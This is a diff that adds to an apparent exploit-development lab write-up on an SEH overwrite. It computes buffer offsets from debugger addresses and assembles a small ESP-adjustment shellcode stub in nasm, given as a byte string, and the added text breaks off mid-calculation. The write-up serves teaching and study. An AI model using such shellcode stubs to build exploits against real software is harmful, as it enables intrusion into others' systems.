@@ -465,6 +465,28 @@ We can scroll down in our top-left pane and find out the address that this buffe
 
 ![](/assets/images/CTP/endofbuffer.JPG)
 
+As you can see, the last address space before we run into our SEH overwrite code is `0177FFC3`. Let's subtract our current location from this to determine how many bytes we have to play with: (`0177FFC3` - `0177FF6D` = `56` or 86 in decimal). So we have ~86 bytes to play with. Not quite enough for anything besides possibly a longer jump. The longer jump will be performed by setting a register value to the location of the beginning of our `A` buffer and then jumping to that register with a `call` instruction. 
+
+But first, we need to reset ESP so that our decoded shellcode will appear where we want it. Let's place it right at the end of our `A` buffer so that we have max room. Currently `ESP` points to `0177FFED` so to figure out how much to subtract to get it to `0177FFC3`, we just subtract (`0177FFED` - `0177FFC3` = `2A`). So our `ESP` adjustment code will be:
+```terminal_session
+nasm > push esp
+00000000  54                push esp
+nasm > pop eax
+00000000  58                pop eax
+nasm > sub al, 0x2a
+00000000  2C2A              sub al,0x2a
+nasm > push eax
+00000000  50                push eax
+nasm > pop esp
+00000000  5C                pop esp
+nasm > 
+```
+
+So we'll put the variable `espAdj2` and set it equal to: `\x54\x58\x2c\x2a\x50\x5c`. 
+
+We need to calculate how many `A` chars will come before our `espAdj2` code. The `A` buffer starts at `0177F20A`, so to calculate we do: (`0177FF6D` - `0177F20A`
+
+
 -- TO BE CONTINUED... --
 
 ## Resources
